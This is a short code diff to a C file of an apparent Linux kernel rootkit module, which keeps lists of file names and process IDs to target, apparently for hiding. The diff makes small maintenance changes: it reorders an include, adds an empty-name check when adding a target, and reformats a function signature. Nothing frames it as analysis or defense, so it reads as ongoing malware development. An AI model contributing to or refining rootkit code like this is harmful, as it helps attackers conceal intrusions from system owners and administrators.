@@ -1,6 +1,6 @@
 // SPDX-License-Identifier: GPL-2.0
-#include <linux/string.h>
 #include "rootkit.h"
+#include <linux/string.h>
 
 struct rk_target_list rk_file_targets;
 struct rk_target_list rk_pid_targets;
@@ -18,6 +18,8 @@ int rk_target_add(struct rk_target_list *list, const char *name)
 	unsigned long flags;
 	int ret = 0;
 
+	if (!name || !*name)
+		return -EINVAL;
 	spin_lock_irqsave(&list->lock, flags);
 	if (list->count >= RK_TARGET_MAX) {
 		ret = -ENOSPC;
@@ -67,8 +69,7 @@ bool rk_target_match(struct rk_target_list *list, const char *name)
 	return found;
 }
 
-bool rk_line_matches(struct rk_target_list *list,
-		     const char *line, int len)
+bool rk_line_matches(struct rk_target_list *list, const char *line, int len)
 {
 	unsigned long flags;
 	bool found = false;
